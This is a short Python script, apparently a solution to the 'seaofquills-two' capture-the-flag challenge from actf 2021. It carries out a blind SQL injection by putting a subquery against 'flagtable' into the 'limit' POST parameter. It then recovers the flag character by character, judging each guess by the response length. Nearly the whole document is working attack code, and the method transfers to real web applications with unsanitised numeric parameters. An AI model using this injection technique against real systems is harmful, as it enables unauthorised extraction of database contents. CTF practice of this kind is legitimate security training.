import requests
from string import digits, ascii_letters

offset = 0
cols = 'url,desc,name'
flag = 'actf{'
characters = [i for i in digits + ascii_letters] + ['\_', '!', '#', '@', '$', '}']

url = 'https://seaofquills-two.2021.chall.actf.co/quills'


while flag[-1]!='}':
    for c in characters:
        nxf = flag+c
        payload = {
                    'cols': cols,
                    'offset': offset,
                    'limit':'0\n + (select count(*) from flagtable where flag like "{}%" escape "\\")'.format(nxf)
                    }
        
        r = requests.post(url, data=payload).content
        if len(r)>1000:
            flag = nxf
            print(flag)
            break
print(flag)

#while 
